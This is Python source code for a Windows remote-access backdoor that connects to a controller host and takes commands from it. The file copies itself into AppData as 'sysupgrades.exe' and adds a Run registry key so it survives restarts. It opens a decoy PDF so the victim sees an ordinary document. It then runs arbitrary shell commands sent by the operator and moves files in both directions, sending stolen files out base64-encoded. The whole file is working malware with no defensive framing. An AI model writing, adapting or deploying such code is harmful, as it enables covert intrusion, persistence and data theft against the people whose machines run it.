import socket
import subprocess
import os
import base64
import simplejson
import shutil
import sys

class BDClass():
        def __init__(self, ip, port):
            self.connec = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.connec.connect((ip,port))

        def lop_pg(self):
                new_file = os.environ["appdata"] + "\\sysupgrades.exe"
                if not os.path.exists(new_file):
                        shutil.copyfile(sys.executable,new_file)
                        regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file
                        subprocess.call(regedit_command, shell=True)
        def open_added_file(self):
                added_file = sys._MEIPASS + "\\filename.pdf"
                subprocess.Popen(added_file, shell=True)


        def json_send(self,data):
            json_data = simplejson.dumps(data)
            self.connec.send(json_data.encode("utf-8"))

        def json_receive(self):
            json_data = ""
            while True:
                try:
                    json_data = json_data + self.connec.recv(1024).decode()
                    return simplejson.loads(json_data)
                except ValueError:
                    continue

        def exe_command(self,command):
            try:
                command_exec = subprocess.check_output(command, shell=True)
                return command_exec
            except:
                return "not command\n"
        def command_cd(self,path):
            try:
                os.chdir(path)
                return "change directory !"
            except:
                return "error change directory !"
        
        def connection_quit(self):
            try:
                self.connec.close()
                exit()
            except:
                exit()

        def send_file(self,path):
            try:
                with open(path,"rb") as up_file:
                    up_file = up_file.read()
                    return base64.b64encode(up_file)
            except:
                pass
            
        def save_file(self,path,content):
            try:
                with open(path,"wb+") as savefile:
                    savefile.write(content)
                    messagesnd = "upload ok"
                    return messagesnd
            except:
                pass
                               
        def send_output(self): 
            try:  
                while True:
                    comm = self.json_receive()
                    print(comm)
                    if comm[0] == "quit":
                        self.connection_quit()
                    elif comm[0] == "cd" and len(comm) > 1:
                        cd_result = self.command_cd(comm[1])
                        self.json_send(cd_result)
                    elif comm[0] == "download":
                        result_command = self.send_file(comm[1])
                        self.json_send(result_command)
                    elif comm[0] == "upload":
                        comm[2] = base64.b64decode(comm[2])
                        save_result = self.save_file(comm[1],comm[2])
                        self.json_send(save_result)
                    else:
                        comsend = self.exe_command(comm)
                        self.json_send(comsend)
            except:
                pass
            self.connec.close()

create_obj = BDClass("127.0.0.1", 8080)
create_obj.lop_pg()
create_obj.open_added_file()
create_obj.send_output()


